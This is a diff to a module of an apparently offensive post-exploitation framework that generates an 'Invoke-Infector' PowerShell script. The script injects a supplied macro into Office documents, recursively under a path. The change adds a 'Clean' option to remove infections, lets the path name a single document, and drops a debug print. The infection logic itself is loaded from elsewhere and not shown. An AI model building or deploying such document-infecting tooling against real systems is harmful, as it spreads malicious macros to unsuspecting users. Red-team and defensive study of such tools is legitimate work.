@@ -51,13 +51,18 @@ class Module:
                 'Value'         :   ''
             },
 	    'InfectionPath' : {
-		'Description'	:   'Path of where to recursively infect',
+		'Description'	:   'Path of where to recursively infect or the path of the specific document',
 		'Required'	:   True,
 		'Value'		:   ''
 	    },
 	    'Macro' : {
 		'Description'	:   'Path of the Macro',
 		'Required'	:   True,
+		'Value'		:   ''
+	    },
+	    'Clean' : {
+		'Description'	:   'Clean documents?',
+		'Required'	:   False,
 		'Value'		:   ''
 	    }
         }
@@ -104,13 +109,16 @@ class Module:
         f.close()
         script = """
 [CmdletBinding()] Param(
-	[Parameter(Mandatory = $True)]
-        [String]
-        $InfectionPath
-)
+    [Parameter(Mandatory = $True)]
+    [String]
+    $InfectionPath,
 
-function Invoke-Infector([String] $InfectionPath) {
-$Code = @"
+    [Parameter(Mandatory = $False)]
+    [Switch]
+    $Clean
+)
+function Invoke-Infector([String] $InfectionPath, [Switch] $Clean) {
+	$Code = @"
 """
         script += macro
         script += """
@@ -119,7 +127,6 @@ $Code = @"
         script += moduleCode
 
 	script += "\nInvoke-Infector"
-	print script
         # add any arguments to the end execution of the script
         for option,values in self.options.iteritems():
             if option.lower() != "agent":
